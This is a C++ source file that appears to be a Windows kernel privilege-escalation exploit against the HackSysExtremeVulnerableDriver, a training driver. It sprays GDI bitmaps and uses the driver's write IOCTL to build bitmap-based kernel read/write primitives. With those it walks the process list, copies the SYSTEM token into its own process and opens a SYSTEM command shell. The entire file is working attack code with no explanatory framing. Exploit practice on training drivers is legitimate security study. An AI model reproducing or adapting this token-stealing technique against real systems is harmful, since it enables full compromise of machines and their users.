#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
LONG ReadMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, sizeof(PVOID), &src) == 0) {
		printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return GetBitmapBits(hWorker, len, dest) ? TRUE : FALSE;
}
LONG WriteMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, len, &src) == 0) {
		//printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return SetBitmapBits(hWorker, len, &dest) ? TRUE : FALSE;
}
int main()
{
	DWORD64 size = 0x10000000 - 0x260;
	BYTE *pBits=new BYTE[size];
	memset(pBits,0x41,size);
	HBITMAP *hbitmap = new HBITMAP[10];
	for (size_t i = 0; i < 4; i++)
	{
		hbitmap[i] = CreateBitmap(0x3FFFF64, 1, 1, 32, pBits);
	}
	DWORD64 teb = (DWORD64)NtCurrentTeb();
	//+0x078 Win32ThreadInfo  : 0xffff9fd4`806fbb10 Void
	DWORD64 pointer = *(PDWORD64)(teb + 0x78);
	DWORD64 ThreadInfoaddr = pointer & 0xFFFFFFFFF0000000;
	ThreadInfoaddr += 0x16300000;
	printf("ThreadInfoaddr=%llX\n", ThreadInfoaddr);
	DWORD64 num;
	DeleteObject(hbitmap[1]);
	HBITMAP *bitmap = new HBITMAP[10000];
	for (size_t i = 0; i < 10000; i++) {
		//1067下为0x368
		bitmap[i] = CreateBitmap(0x364, 1, 1, 32, pBits);
		if (bitmap[i]==0)
		{
			num = i;
			break;
		}
	}


	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return(-1);
	}
	DWORD64 buf[2];
	buf[1] = ((ULONG64)ThreadInfoaddr + 0x50);
	printf("hManagerpvScan0=%llX\n", buf[1]);
	ULONG64 temp = ((ULONG64)ThreadInfoaddr + 0x50 + 0x1000);
	buf[0] = (ULONG64)&temp;
	printf("hWorkerpvScan0=%llX\n", *(ULONG64*)*buf);
	LPDWORD dwBytesOut{};
	//修改结构体指针
	DeviceIoControl(hDriver, 0x22200b, buf, 0x10, 0, 0, dwBytesOut, NULL);


	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	PVOID64 UserBase;
	HMODULE nbase;
	ULONG64 address;
	ULONG64 PsInitialSystemProcess;
	//遍历模块
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	//获取第一个模块地址
	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
	UserBase = lpImageBase[0];
	nbase = LoadLibrary(L"ntoskrnl.exe");
	printf("UserBase=%llX\n", UserBase);
	address = (ULONG64)GetProcAddress(nbase, "PsInitialSystemProcess");
	//PsInitialSystemProcess 是一个指向system EPROCESS的指针
	PsInitialSystemProcess = ((ULONG64)address - (ULONG64)nbase + (ULONG64)UserBase);
	printf("PsInitialSystemProcess=%llX\n", PsInitialSystemProcess);

	LIST_ENTRY ActiveProcessLinks{};
	DWORD64 currentProcess;//当前进程eporcess
	ULONG64 UniqueProcessId;
	ULONG64 SystemProcess{};
	ULONG64 indexa = 1;
	ULONG64 indexb = 2;
	printf("num=%d\n",num);
	for (size_t i = 0; i < num; i++)
	{

		WriteMemory(bitmap[i], bitmap[i + 1], &indexa,
			(LPVOID)indexb, sizeof(LPVOID));
			if (indexa == 2)
			{
				indexa = i;
				indexb = i + 1;
				printf("indexa=%d indexb=%d\n", i, i+1);
				break;
			}
	}
	ReadMemory(bitmap[indexa], bitmap[indexb], (PVOID)PsInitialSystemProcess,
		&SystemProcess, sizeof(LPVOID));
	printf("SystemEProcess=%llX\n", SystemProcess);
	DWORD dwCurrentPID;
	//+0x2e8 ActiveProcessLinks : _LIST_ENTRY
	ReadMemory(bitmap[indexa], bitmap[indexb], (PVOID)(SystemProcess + 0x2e8), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	do
	{
		currentProcess = (DWORD64)((PUCHAR)ActiveProcessLinks.Flink - 0x2e8);
		ReadMemory(bitmap[indexa], bitmap[indexb], (PVOID)(currentProcess + 0x2e0), &UniqueProcessId, sizeof(LPVOID));
		dwCurrentPID = LOWORD(UniqueProcessId);
		ReadMemory(bitmap[indexa], bitmap[indexb], (PVOID)(currentProcess + 0x2e8), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != GetCurrentProcessId());
	ULONG64 systemtoken{};
	//+0x358 Token            : _EX_FAST_REF
	printf("eProcessToken=%llX\n", currentProcess + 0x358);
	ReadMemory(bitmap[indexa], bitmap[indexb], (PVOID)(SystemProcess + 0x358),
		&systemtoken, sizeof(LPVOID));
	printf("systemtoken=%llX\n", systemtoken);
	WriteMemory(bitmap[indexa], bitmap[indexb], (PVOID)(currentProcess + 0x358),
		(PVOID)systemtoken, sizeof(LPVOID));

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);

	getchar();
	return 0;
}

